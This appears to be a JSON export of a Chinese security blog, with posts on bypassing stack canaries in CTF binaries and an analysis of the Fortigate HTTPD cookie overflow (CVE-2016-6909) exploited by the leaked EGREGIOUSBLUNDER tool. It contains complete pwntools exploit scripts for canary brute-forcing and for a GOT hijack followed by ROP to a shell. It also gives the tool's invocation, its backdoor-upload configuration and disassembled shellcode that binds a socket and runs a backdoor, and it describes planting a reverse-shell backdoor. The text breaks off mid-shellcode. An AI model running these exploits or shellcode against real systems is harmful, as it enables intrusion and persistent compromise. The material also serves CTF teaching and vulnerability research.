{"pages":[{"title":"categories","text":"","link":"/categories/index 2.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"","link":"/about/index 2.html"},{"title":"about","text":"","link":"/about/index.html"},{"title":"photos","text":"","link":"/photos/index 2.html"},{"title":"photos","text":"","link":"/photos/index.html"}],"posts":[{"title":"Bypassing Canary——Brute force","text":"我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中也包括了Canary，它由下面这个函数产生：12// glibc-2.29 -- csu/libc-start.cuintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random) 也就是说Canary的值在程序一开始运行时就已经确定了。而对于典型的多进程并发服务器，程序统一由父进程来accept连接，然后fork子进程处理读写。子进程数据空间中的内容是父进程的完整拷贝，二者具有相同的Canary，这也让爆破Canary成为了可能。 首先Canary第0位永远是0x00，这是为了防止Canary被打印出来做的截断。 确定溢出长度后，在该长度基础上逐位增加一字节爆破，如果程序没有崩溃则说明该位正确 一直跑出Canary的所有位，64位程序最多尝试7*256次，32位最多尝试3*256次 下面来看具体的例子 NJCTF2017 messagerchecksec: 1234567$ checksec messager[*] '/root/NJCTF2017/messager' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 分析使用IDA分析，我们可以得到第一个关键信息 这是一个典型的多进程并发服务器 结合上面checksec的结果，首先想到的应该就是想办法爆破Canary。 12345678910111213141516171819202122232425262728293031323334353637... while ( 1 ) { fd = accept(sock, &amp;sock_addr, &amp;addr_len); if ( fd == -1 ) { perror(\"accept\"); return 0xFFFFFFFFLL; } send(fd, \"Welcome!\\n\", 9uLL, 0); pid = fork(); if ( pid == -1 ) { perror(\"fork\"); return 0xFFFFFFFFLL; } if ( !pid ) break; close(fd); } signal(14, (__sighandler_t)handler); alarm(3u); if ( (unsigned int)handle_message() ) { if ( send(fd, \"Message receive failed\\n\", 0x19uLL, 0) == -1 ) { perror(\"send\"); return 0xFFFFFFFFLL; } } else if ( send(fd, \"Message received!\\n\", 0x12uLL, 0) == -1 ) { perror(\"send\"); return 0xFFFFFFFFLL; } return 0LL;} 进一步查看处理连接的函数handle_message()，可以得到另外两个关键信息： Canary在rbp-0x8处 读取用户输入时存在一个栈溢漏洞，需要填充的空间大小为0x78-0x10=0x68字节 12345678910111213141516171819202122signed __int64 handle_message(){ signed __int64 result; // rax char s; // [rsp+10h] [rbp-70h] unsigned __int64 canary; // [rsp+78h] [rbp-8h] //canary位于rbp-0x8 canary = __readfsqword(0x28u); printf(\"csfd = %d\\n\", (unsigned int)fd); bzero(&amp;s, 0x64uLL); if ( (unsigned int)recv(fd, &amp;s, 0x400uLL, 0) == -1 ) //s的大小只有0x68字节 { perror(\"recv\"); result = 0xFFFFFFFFLL; } else { printf(\"Message come: %s\", &amp;s); fflush(stdout); result = 0LL; } return result;} 再检查剩下的几个函数，函数sub_400b76()将打开文件flag并将内容写入bss中： 123456789101112ssize_t read_flag(){ int fd; // [rsp+Ch] [rbp-4h] fd = open(\"./flag\", 0); if ( fd &lt; 0 ) { perror(\"open flag failed\"); exit(0); } return read(fd, &amp;flag, 0x64uLL);} 函数sub_400bc6()向fd中发送flag，这里重命名为send_flag()。 1234ssize_t sned_flag(){ return send(fd, &amp;flag, 0x64uLL, 0);} 利用因此利用思路就可以确定如下，结合上面静态分析得到的信息，甚至不用调试 逐字节爆破Canary 已用栈溢出覆盖返回地址 在溢出数据恰当的偏移处填上爆破出的Canary 将返回地址覆盖为sned_flag()的地址 12345678910111213141516171819202122232425262728293031#!/usr/bin/pythonfrom pwn import *context.log_level = 'WARN'send_flag = p64(0x400bc6)# leak Canarycanary = \"\\x00\" #Canary的最低位为0x00for x in range(7): for y in xrange(256): p = remote(\"127.0.0.1\", 5555) p.recv() p.send(\"A\"*0x68+canary+chr(y)) try: p.recv() except: p.close() continue p.close() break canary += chr(y) print(\"[*] Canary byte \" + str(x+1) +\": \" + hex(y))p = remote(\"127.0.0.1\", 5555)p.recv()p.send(\"A\"*0x68+canary+\"A\"*8+send_flag)flag = p.recv()p.close()print('[+] flag is:' + flag) Exp运行结果：","link":"/post/65468.html"},{"title":"Bypassing Canary——Leak Canary","text":"泄漏Canary的值是过Canary的最基本的操作了，通常来说有两种情况： 可以利用格式化字符串 可以控制程序输出的长度 但要注意的是，对于第二种情况，Linux种Canary的第0个字节为0x00，这意味着字符串函数在命中Canary时会被截断。解决方法是将0x00覆盖，之后利用时再还原位0x00。","link":"/post/9171.html"},{"title":"Bypassing Canary——Override Canary in TLS","text":"TL;DR 线程局部存储（TLS）作用 glibc中为TLS设置Canary的过程 同时覆盖TLS和返回地址前的Canary——StarCTF2018 babystack TLS通常在C程序中常存在全局变量、静态变量以及局部变量，对于局部变量来说，并不存在线程安全问题。而对于全局变量和函数内定义的静态变量，同一进程中各个线程都可以访问它们，因此它们存在多线程读写问题。 如果需要在一个线程内部的各个函数调用都能访问、但其它线程不能访问的变量（被称为static memory local to a thread 线程局部静态变量），就需要新的机制来实现。这就是TLS。 线程局部存储（Thread Local Storage，TLS）机制就是为解决这个问题而生的，通过该机制分配变量，以便每一个现存的线程都有一个变量实例。它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。 当函数在不同的线程上被调用时，该线程会被分配新的栈，并且Canary会被放置在TLS上。TLS位于栈的顶部，当溢出长度较大时，可以同时覆盖返回地址前的 Canary 和 TLS 中的 Canary 实现绕过。 Glibc中设置Canary的过程从glibc源码中可以看到，定义了THREAD_SET_STACK_GUARD时，Canary通过这个宏被设置；否则存入全局变量__stack_chk_guard中 1234567 /* Set up the stack checker's canary. */ uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);# ifdef THREAD_SET_STACK_GUARD THREAD_SET_STACK_GUARD (stack_chk_guard);# else __stack_chk_guard = stack_chk_guard;# endif 进一步查看THREAD_SET_STACK_GUARD定义 12# define THREAD_SET_STACK_GUARD(value) \\ THREAD_SETMEM (THREAD_SELF, header.stack_guard, value) 查看THREAD_SETMEM，可以看到这个宏通过内联汇编，将vlaue，也就是Canary放入了fs寄存器的某个偏移处，而这个偏移处又是通过offsetof宏得到的pthread结构体某个成员的偏移，在上面的代码中，可以看到传入的是成员header.stack_guard。 1234567891011121314151617181920# define THREAD_SETMEM(descr, member, value) \\ ({ if (sizeof (descr-&gt;member) == 1) \\ asm volatile (\"movb %b0,%%fs:%P1\" : \\ : \"iq\" (value), \\ \"i\" (offsetof (struct pthread, member))); \\ else if (sizeof (descr-&gt;member) == 4) \\ asm volatile (\"movl %0,%%fs:%P1\" : \\ : IMM_MODE (value), \\ \"i\" (offsetof (struct pthread, member))); \\ else \\ { \\ if (sizeof (descr-&gt;member) != 8) \\ /* There should not be any value with a size other than 1, \\ 4 or 8. */ \\ abort (); \\ \\ asm volatile (\"movq %q0,%%fs:%P1\" : \\ : IMM_MODE ((uint64_t) cast_to_integer (value)), \\ \"i\" (offsetof (struct pthread, member))); \\ }}) pthread是一个超大的结构体，这里略去余下部分 123456789...struct pthread{ union {#if !TLS_DTV_AT_TP /* This overlaps the TCB as used for TLS without threads (see tls.h). */ tcbhead_t header;... Canary正是存储在tcbhead_t中的stack_guard，根据变量类型可以计算出在32位和64位上的偏移： 32位 gs:0x14 （0x4×3+0x4×3+0x4） 64位 fs:0x28（0x8×3+0x4×3+0x8） 1234567891011121314151617181920212223242526272829typedef struct{ void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; unsigned long int vgetcpu_cache[2]; /* Bit 0: X86_FEATURE_1_IBT. Bit 1: X86_FEATURE_1_SHSTK. */ unsigned int feature_1; int __glibc_unused1; /* Reservation of some values for the TM ABI. */ void *__private_tm[4]; /* GCC split stack support. */ void *__private_ss; /* The lowest address of shadow stack, */ unsigned long long int ssp_base; /* Must be kept even if it is no longer used by glibc since programs, like AddressSanitizer, depend on the size of tcbhead_t. */ __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32))); void *__padding[8];} tcbhead_t; StarCTF2018 babystack","link":"/post/34550.html"},{"title":"Bypassing Canary——SSP Leak","text":"SSP Leak","link":"/post/36591.html"},{"title":"Bypassing Canary——hijack __stack_chk_fail","text":"我们都知道，Canary验证失败后会调用 __stack_chk_fail 函数打印如下信息： 1stack smashing detected ***: ./XXX terminated __stack_chk_fail 是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数，来达到Bypass Canary的目的，但只有程序的RELRO为Partial RELRO才可以执行这种操作，下面来看一个具体的例子。 NJCTF2017 messagerchecksec1234567$ checksec login[*] '/root/ZCTF2017/login' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 运行结果： 第一步：覆盖__stack_chk_fail 的GOT表项 观察上图，format string实际存放在0xffce2ed6，字符串被sprintf写入0xffce2e5c（eax），所以要覆写format string，payload前还需要0xffce2ed6 - 0xffce2e5c = 0x7a字节，具体填充在下面代码注释中： 123456789101112131415161718def exploit(): # __stack_chk_fail GOT表中的地址，用于后面修改 payload = p32(binary.symbols['got.__stack_chk_fail']) # sprintf写入字符串的长度为0x4c，减去前面__stack_chk_fail的地址，再加上ebp payload += 'a' * (0x48+0x4) # 将返回地址覆盖为main函数地址，以便再次获得执行机会 payload += p32(binary.symbols['main']) # 填充一定字节直到可以覆盖format string payload += 'a' * 0x26 # 将format string修改为如下内容 payload += r'%s:%39x%10$hhn' + '\\x00' # %s 读取payload，使格式化字符串被覆盖 # %n 配合%c或%x使用，%n负责统计输出的字符数量,写入到%n对应变量里。 # 在上面的%10$hhn中，10$指第10个变量，hhn指写入一个字节 # 8 alarm # 39 malloc... 第二步： leak libc第一部分的代码执行完后，__stack_chk_fail 的GOT被覆盖为malloc@plt，不会触发Canary机制，同时返回到main中，我们有了第二次输入的机会。 第二次输入将返回地址覆盖为puts，返回地址依然设为main以获得第三次输入的机会，同时将puts的GOT表项作为puts的参数，这样我们就可以泄漏libc中puts的地址。 12345678910111213141516171819202122232425... payload = 'a' * 0x50 payload += p32(binary.symbols['plt.puts']) # return address payload += p32(binary.symbols['main']) # return from puts payload += p32(binary.symbols['got.puts']) # args of puts # leak libc input_username(payload) input_passsword(p32(0)) p.recvuntil('aaaa') # `Login successful!`后的回显 p.recvline() # 读取完整的该行回显 leak = p.recvline()[:4] # 第二次puts的输出，取前4字节 leak = u32(leak) print 'leak = ', hex(leak) libc.address = leak - libc.symbols['puts'] print 'libc.address = ', hex(libc.address) system = libc.symbols['system'] bin_sh = next(libc.search('/bin/sh\\x00')) print 'system = ', hex(system) print 'bin_sh = ', hex(bin_sh)... 第三步：通过ROP get shell泄漏出libc地址后，通过ROP get shell 123456789payload = 'a' * 0x50payload += p32(libc.symbols['system'])payload += 'a' * 0x4 # 任意4字节payload += p32(bin_sh)input_username(payload)input_passsword(p32(0))p.interactive() 完整exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#!/usr/bin/pythonfrom pwn import *context.os = 'linux'context.terminal = ['tmux', 'splitw', '-h']# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']context.log_level = 'DEBUG'libc_path = './libc-2.19.so'bin_path = './login'libc = ELF(libc_path)binary = ELF(bin_path)host = ''port = 6666def debug(command=''): gdb.attach(p, command)def input_username(name): p.recvuntil('username:') p.sendline(name)def input_passsword(password): p.recvuntil('password:') p.sendline(password)def exploit(): #debug('b *0x8048751\\nc\\n') payload = p32(binary.symbols['got.__stack_chk_fail']) # stack payload += 'a' * (0x48+0x4) # stack+ebp payload += p32(binary.symbols['main']) # ret addr payload += 'a' * 0x26 # padding payload += r'%s:%39x%10$hhn' + '\\x00' input_username(payload) input_passsword(p32(0)) payload = 'a' * 0x50 payload += p32(binary.symbols['plt.puts']) payload += p32(binary.symbols['main']) payload += p32(binary.symbols['got.puts']) # leak libc input_username(payload) input_passsword(p32(0)) p.recvuntil('aaaa') p.recvline() leak = p.recvline()[:4] leak = u32(leak) print 'leak = ', hex(leak) libc.address = leak - libc.symbols['puts'] print 'libc.address = ', hex(libc.address) system = libc.symbols['system'] bin_sh = next(libc.search('/bin/sh\\x00')) print 'system = ', hex(system) print 'bin_sh = ', hex(bin_sh) payload = 'a' * 0x50 payload += p32(libc.symbols['system']) payload += p32(binary.symbols['main']) payload += p32(bin_sh) input_username(payload) input_passsword(p32(0)) p.interactive()if __name__ == '__main__': if len(sys.argv) == 1: global p p = process(executable=bin_path, argv=[bin_path]) #, env={'LD_PRELOAD':libc_path}) else: p = remote(host, port) exploit() exp运行结果：","link":"/post/34549.html"},{"title":"CVE-2016-6909——Fortigate防火墙HTTPD栈溢出漏洞","text":"TL;DR 对Fortigate固件和启动的流程的静态分析 在Fortigate防火墙中建立调试环境 Fortigate防火墙HTTPD栈溢出漏洞(CVE-2016-6909 )的分析 对Equation Group利用工具EGREGIOUSBLUNDER的分析 2016年，Shadow Brokers公开了黑客组织Equation Group针对各大厂商防火墙的漏洞利用工具遭到泄露。笔者找到了一个Fortigate防火墙的虚拟机版——FGT_VM-v400-build0482，正巧就在受漏洞影响的版本范围内，遂对利用工具中的EGREGIOUSBLUNDER进行了一番深入分析。相比起其他工具的奇葩名字，EGREGIOUSBLUNDER （令人震惊的错误）倒是十分贴切的。它利用了[CVE-2016-6909——Fortigate防火墙Web管理界面HTTP cookie的栈溢出漏洞，直接覆盖返回地址就可以控制程序指针，经典的栈溢出。按理说这种漏洞什么太高的技术含量，但是在防火墙上动态调试环境的搭建以及该工具中shellcode的编写都挺有意思的，所以觉得还是记录一下。 环境搭建和工具介绍Fortigate防火墙配置启动防火墙后，我们可以看到用于配置防火墙的CLI，这并不是底层系统的交互式shell，只能输入下面几个命令：1234567891011Fortigate-VM login: adminPassword: #默认密码为空Welcome !Fortigate-VM #config config objectget get dynamic and system informationshow show configurationdiagnose diagnose facilityexecute execute static commandsexit exit CLI EGREGIOUSBLUNDER工具使用该工具需要指定很多参数，特比是需要指定一个特别的栈地址，而该地址在不同产品上都不相同吗，因此程序还附带了一个配置文件EGBL.config，里面记录了不同型号产品的相关参数。 EGBL.config的开头有几项配置，可以更改上传的后门、上传后的文件名以及执行后的进程名。 12345678# path/name of local, static-built noserver to upload NOSERV = /root/noserver# path/name of local noclient to run, should match version of server NOCLI = /root/noclient# name of noserver file on target NONAME = /bin/httpd# name of process on target NOFAKE = /bin/httpsd 还需要一个登录Web界面时设置的cookie的值，获取方式如下：12$ curl -X HEAD -v http://192.168.123.100/login 2&gt;&amp;1 | grep APSCOOKIE(standard input):15:&lt; Set-Cookie: APSCOOKIE_3943997904=0&amp;0; path=/; expires=Tue, 31-Dec-1968 16:48:05 GMT 接着以如下方式执行，如果后面想抓包分析的话指定80端口同时关闭ssl（设置为0），但同时也需要更改防火墙默认配置（开始http支持，默认使用https）。 123456789101112$ ./egregiousblunder -t 192.168.123.100 -p 443 -l 4444 --ssl 1 --nope --gen 4nc --cookienum 3943997904 --stack 0xbffff104loading nopen over HTTPSusing stack addr 0xbffff104built authhash len 116built enc_authhash with len 116received good ACK1 message c0edbabereceived stack addr 0xbffff104sent the file len/header, next is the file..................................done with sending (356996 bytes), waiting for file ackreceived good ACK2 message 356996, upload is cool... Tip: 笔者找到的这个Fortigate VM版的溢出地址值并不在EGBL.config中，所以只能通过一个shell脚本将一个地址范围遍历了一遍才找到正确的地址值。 防火墙Web管理界面登录流程通过WEB方式登陆防火墙时，首先发送POST请求，请求包含登录名和密码。 登录成功后，服务器响应一个APSCOOKIE作为身份验证令牌， 这个cookie值必须包含在任何后续请求中。 接下来看看egregiousblunder发送的数据包，通过发送一个包含精心构造的APSCOOKIE的HTTP请求，将shellcode布置在cookie中。 文件系统和启动流程分析一个设备固件的分析过程，通常包括了对固件文件的解密、文件系统还原、固件文件的修改及重构等。好在VM版的Fortigate并没有加密，我们只需想办法提取到文件系统，然后就是分析系统启动流程，包括内核、内核参数、初始化文件以及系统服务程序等就行。 获取vmdk硬盘中的文件系统给Kali Linux添加一块现有硬盘，选择fortigate的vmdk硬盘。 进入系统后，查看并挂载新添加的硬盘，可以看到硬盘分区中的文件。12345678910111213141516171819202122$ mkdir fortios$ fdisk -lDisk /dev/sda: 80 GiB, 85899345920 bytes, 167772160 sectors...Device Boot Start End Sectors Size Id Type/dev/sdb1 * 1 262144 262144 128M 83 Linux/dev/sdb2 262145 4194304 3932160 1.9G 83 Linux$ mount /dev/sdb1 fortios$ cd fortios &amp;&amp; lltotal 23M-rw-r--r-- 1 root root 5.0M Sep 21 2011 datafs.tar.gz-rw-r--r-- 1 root root 107 Sep 21 2011 extlinux.conflrwxrwxrwx 1 root root 12 Sep 21 2011 flatkc -&gt; ./flatkc.smp-rw-r--r-- 1 root root 256 Sep 21 2011 flatkc.chk-rw-r--r-- 1 root root 1.4M Sep 21 2011 flatkc.nosmp-rw-r--r-- 1 root root 1.5M Sep 21 2011 flatkc.smp-r--r--r-- 1 root root 32K Sep 21 2011 ldlinux.sysdrwx------ 2 root root 12K Sep 21 2011 lost+found-rw-r--r-- 1 root root 15M Sep 21 2011 rootfs.gz-rw-r--r-- 1 root root 256 Sep 21 2011 rootfs.gz.chk 查看所有文件类型，最值得注意的是两个Linux内核（支持和不支持多处理器的内核），还有一个疑似initial ramdisk的文件rootfs.gz，说明这个防火墙是基于Linux的；还有一个SYSLINUX引导加载程序，我们可以查看它的配置文件extlinux.conf查看启动参数，进而确定rootfs.gz就是一个initial ramdisk。 12345678910111213$ file *datafs.tar.gz: gzip compressed data, last modified: Tue Sep 20 20:17:56 2011, from Unix, original size 8724480extlinux.conf: ASCII textflatkc: symbolic link to ./flatkc.smpflatkc.chk: dataflatkc.nosmp: Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #2 Tue Sep 20 12:46:19 PDT 2011, RO-rootFS, Normal VGAflatkc.smp: Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #3 Tue Sep 20 12:49:39 PDT 2011, RO-rootFS, Normal VGAldlinux.sys: SYSLINUX loader (version 4.00)lost+found: directoryrootfs.gz: gzip compressed data, last modified: Tue Sep 20 20:17:52 2011, from Unix, original size 19077120rootfs.gz.chk: data$ cat extlinux.confDEFAULT flatkc ro panic=5 endbase=0xA0000 console=tty0 root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz 继续解压rootfs.gz后是符合FHS的目录结构，只是bin目录被打包压缩了。到这里，整个防火墙的文件系统已经呈现在我们面前了。 12345678910111213141516171819$ file rootfsrootfs: POSIX tar archive (GNU)$ mkdir _rootfs &amp;&amp; mv rootfs _rootfs &amp;&amp; cd _rootfs$ tar xf rootfs$ lltotal 31M-rw-r--r-- 1 root root 8.4M Sep 21 2011 bin.tar.xzdrwxr-xr-x 2 root root 1.0K Sep 21 2011 datadrwxr-xr-x 2 root root 1.0K Sep 21 2011 data2drwxr-xr-x 5 root root 13K Sep 21 2011 devlrwxrwxrwx 1 root root 8 Sep 21 2011 etc -&gt; data/etclrwxrwxrwx 1 root root 1 Sep 21 2011 fortidev -&gt; /drwxr-xr-x 2 root root 1.0K Sep 21 2011 lib-rw-r--r-- 1 root root 4.3M Sep 21 2011 migadmin.tar.xzdrwxr-xr-x 2 root root 1.0K Sep 21 2011 proc-rw-r--r-- 1 root root 19M Sep 21 2011 rootfsdrwxr-xr-x 2 root root 1.0K Sep 21 2011 sbindrwxr-xr-x 2 root root 1.0K Sep 21 2011 tmpdrwxr-xr-x 8 root root 1.0K Sep 21 2011 var 初始化程序init分析显然，导致漏洞的程序十有八九就在/bin目录中，但尝试解压bin.tar.xz时，却发生了错误。按照System V的启动方式来看，首先内核首先启动的程序应该是/sbin/init，因此可以逆向该程序查看bin.tar.xz是如何被解压的。 首先是main函数，以下是经过整理的IDA反编译结果，init程序只做了三件事： 解压bin.tar.xz和migadmin.tar.xz 解压完后删除bin.tar.xz和migadmin.tar.xz 启动/bin/init 123456789101112131415int __cdecl main(){ char *argv; char * const envp[]; if ( decompress((int)\"bin\") &gt;= 0 ) decompress((int)\"migadmin\"); unlink(\"/sbin/xz\"); unlink(\"/sbin/ftar\"); argv = \"/bin/init\"; envp = 0; execve(\"/bin/init\", &amp;argv, &amp;envp); return 0;} 再看看decompress()函数内部，找到解压的参数。 1234567891011121314151617181920212223signed int __cdecl decompress(int a1){ //... snprintf(&amp;s, 0x200u, \"/%s.tar.xz\", a1); //... argv = \"/sbin/xz\"; xz_option_str1 = \"--check=sha256\"; xz_option_str2 = \"-d\"; v19 = &amp;s; v20 = 0; execv(\"/sbin/xz\", &amp;argv); } snprintf(&amp;name, 0x200u, \"/%s.tar\", a1); //...LABEL_21: //... var_438 = \"/sbin/ftar\"; ftar_option_str = \"-xf\"; v14 = &amp;name; v15 = 0; execv(\"/sbin/ftar\", &amp;var_438); return 0;} chroot切换根目录到_rootfs目录解压两个文件 12$ chroot . /sbin/xz -d bin.tar.xz$ chroot . /sbin/ftar -xf bin.tar Tip: 其实进入sbin目录看到两个解压程序xz和ftar就能猜到怎么回事儿了，不过确认一下也好 启动过程分析bin目录中的程序大部分都是指向init和sysctl的软链接，前者实现了防火墙的业务功能，后者类似busybox，提供一些Linux系统命令。 1234567891011121314151617181920$ lltotal 29Mlrwxrwxrwx 1 root root 9 Dec 19 17:31 authd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 cat -&gt; /bin/sysctllrwxrwxrwx 1 root root 11 Dec 19 17:31 chmod -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 cmdbsvr -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 cp -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 dhcpd -&gt; /bin/initlrwxrwxrwx 1 root root 9 Dec 19 17:31 fgfmd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 grep -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 httpsd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 ifconfig -&gt; /bin/sysctl-rwxr-xr-x 1 root root 24M Sep 21 2011 initlrwxrwxrwx 1 root root 9 Dec 19 17:31 initXXXXXXXXXXXXXXXXXX -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 mkdir -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 ospfd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 sh -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 ssh -&gt; /bin/init-rwxr-xr-x 1 root root 154K Sep 21 2011 sysctl... 防火墙启动后，将initXXXXXXXXXXXXXXXXXX作为1号进程，接着fork出一系列的子进程实现业务功能。其中名为httpsd的守护进程，也就是Web服务器进程，根据前面的抓包分析，漏洞应该也和这个进程相关。第二个httpsd用于负责处理http请求，退出后由第一个httpsd负责重启。 建立动态调试环境鉴于init的复杂程度（IDA分析出来有5W+的函数，且没有符号），单纯的依靠静态分析都很难定位到实现httpsd的位置，更不用提漏洞的位置了，而fortigate似乎不像Cisco ASA那样集成了gdbserver，所以我们得自己想办法搞定这个问题，总的来说有两个思路： 将init取出来在本地调试运行； 将gdb移植到防火墙上。 可能是由于init这个程序比较特殊，经过各种尝试都没法再本地将init运行起来，因此笔者只好使用了第二种方法，这其中也有很多坑。 编译GDB这部分挺简单的就不展开讲了，但是需要注意下面几点： GDB版本，本文分析的这个防火墙是基于Linux 2.4内核的，太新的GDB也许会有兼容性问题； 静态编译，以免缺失某些库。 将GDB放入防火墙文件系统准备好GDB后，将rootfs再打包回去时，还是要记得用3.2中的方法，使用防火墙自带的ftar工具将rootfs打包回去，否则防火墙无法正常启动。 获取反向shell为了方便后期随时能接入防火墙进行调试，放置GDB的同时还可以放一个后门程序，用于得到一个shell，因为EGREGIOUSBLUNDER用的那个nopen工具是在不怎么好用。 Tip: 但这里存在一个问题——如何在防火墙启动以后，执行后门来得到shell。经过查询，笔者发现在 Fortigate 的配置命令行中，有一条隐藏命令——fnsysctl来执行前面提到过的sysctl，所以该怎么做大家应该都懂了。 漏洞分析定位漏洞位置查看httpsd的PID，然后GDB attach到第二个httpsd进程上，定位漏洞时，开始想在EGREGIOUSBLUNDER参数中使用的那个栈地址设置观察点，结果没有断下来。无奈只好自己构造发送给防火墙和POST数据包，将shellcode部分修改为无意义的数据，造成异常而中断下来。 最后会发现在函数sub_820CB5E()返回时（0x0820CEFB）产生了异常，再在此处下断，并使用EGREGIOUSBLUNDER，这次ret后就来到了栈上的shellcode中，也就说明了当前函数存在栈溢出。 Tip: 写这篇文章与分析的时间相隔了一年，只找到了几张图片，而且调试环境的建立也挺麻烦的，所以这里就没有贴太多调试过程的图片了。 漏洞成因经过调试可知，该函数用解析cookie，经过整理的IDA反编译结果如下。 1234567891011121314151617181920212223int __cdecl decode_cookie(char *a1){ //... unsigned int Era; // [esp+38h] [ebp-11A0h] char Payload; // [esp+14Ch] [ebp-108Ch] char AuthHash; // [esp+116Ch] [ebp-6Ch] //AuthHash位于ebp下108字节 //... size = 1; if ( a1 ) size = strlen(a1) + 1; src = 0; memset(&amp;AuthHash, 0, 0x52u); // v16 = 20; memset(&amp;Payload, 0, 0x1000u); // ptr = 0; v7 = -1; if ( a1 ) { sub_820C6F0(); if ( sscanf(a1, \"Era=%1d&amp;Payload=%[^&amp;]&amp;AuthHash=%s\", &amp;Era, &amp;Payload, &amp;AuthHash) == 3 ) { //... 该函数在调用sscanf()将Cookie中Era、Payload和AuthHash三个值放进三个变量，却没有检查传入的AuthHash和Payload字符串大小，从而导致了缓冲区溢出。本例中，AuthHash位于ebp下108字节，EGREGIOUSBLUNDER构造了一个116字节的AuthHash，正好覆盖ebp和返回地址。 shellcode分析Linus Torvalds在他的自传Just for fun中谈过Unix“小即是美”的理念，几乎所有事情都由6个基本的系统调用完成（fork、execve、open、write、read和close），个人觉得EGREGIOUSBLUNDER所使用的shellcode就能完美诠释这个理念，它分为两大部分，分别通过变量AuthHash和Payload布置到内存中，并且使用了大量int 80系统调用，将后门nopen程序上传到防火墙并执行。 第一段shellcode因为栈溢出的空间太小，栈上没有足够的位置放置全部shellcode，所以这段shellcode的目的只是为了定位到已经被分配在堆上的第二段shellcode。12345678910nopnopnopmov ebp, esppop ebxpop ecx ; pop useless parameterpop ecx ; pop useless parameterpop eax ; 指向整个Cookie值的指针add eax, 0Eh ; 指向Cookie中Payload字段值的指针jmp eax ; 转跳到堆中的第二段shellcode(decoding处) 第二段shellcode第二段shellcode在前面提到decode_cookie()函数执行前就已经被放入了一块动态分配的内存中，并且指向该内存的指针作为一个参数传入了decode_cookie()，再通过第一段shellcode转跳过来。其功能是将配置文件EGBL.config中指定的后门上传到防火墙上，并通过execve系统调用替换当前的httpsd进程。 shellcode的首要任务就是定位自己在内存中的位置，即确定EIP指针的当前值，第二段shellcode的开始部分就是做这项工作，具体可以参考Shellcoder’s Programming Uncovered的10.3节。1234567sub_A56D165： pop ecx jmp ecxdecoding: call sub_A56D165;... 接着就是一段解码自身的指令。12345678910111213141516;... push eax push ecx push edx push ebx push esp push ebp push esi push edi push ecx pop ecx push 77h ; &apos;w&apos; inc edi pop eax xor al, 77h;... 解码完成后，首先通过getpeername系统调用从0xFF向下遍历可用套接字1234567891011121314151617181920212223242526272829303132333435after_decode: xor ebx, ebx mov edi, esp lea esi, [edi+10h] mov [edi+4], esi lea ecx, [edi+20h] mov [edi+8], ecx mov bl, 10h mov [ecx], ebx xor ecx, ecx mov cl, 0FFhgetpeername: mov [edi], ecx push ecx ; socket fd xor eax, eax mov al, 66h mov bl, 7 mov ecx, edi int 80h ; LINUX - sys_getpeername pop ecx ; fd xor ebx, ebx cmp eax, ebxloc_A56D23D: jnz short loc_A56D249 mov ax, 5C11hloc_A56D243: cmp [esi+2], ax jz short loc_A56D24Bloc_A56D249: loop getpeernameloc_A56D24B: mov ebx, ecx ; socket fd xor ecx, ecxloc_A56D24F: mov cl, 3 找到可用套接字后，将文件描述符0、1、2重定向到socket。123456789101112131415161718sys_dup2: xor eax, eax mov al, 3Fh dec ecx int 80h ; LINUX - sys_dup2 inc ecx loop sys_dup2 mov ebp, esp sub esp, 420h mov [ebp-4], ebx xor eax, eax mov [ebp-8], eax sub eax, 1 mov [ebp-0Ch], eax mov [ebp-10h], esp sub esp, 10h mov [ebp-424h], esp jmp short write 使用wirte系统调用发送确认ack1，其中包含了当前ebp的的信息，攻击程序收到该ACK确认消息后，会根据ebp-64h计算出实际的溢出地址作为提示消息。若发送的地址和收到的地址不同还会弹出警告。123456789101112131415sys_write: mov eax, [ecx+0Ch] xor eax, 0C0EDBABEh mov [ecx+8], eax mov eax, [ecx+14h] xor eax, ebp mov [ecx+10h], eax mov edx, 25h push edx ; len push ecx ; buffer 0xa56d2ae mov ebx, [ebp-4] push ebx ; socket fd 0x6 mov eax, 4 int 80h ; LINUX - sys_write jmp short sys_read 然后通过read接收发送的后门文件长度、文件头等信息。123456789101112131415161718192021222324sys_read: mov edx, 25h ; &apos;%&apos; push edx ; len mov ecx, [ebp-10h] push ecx ; buffer mov ebx, [ebp-4] ; 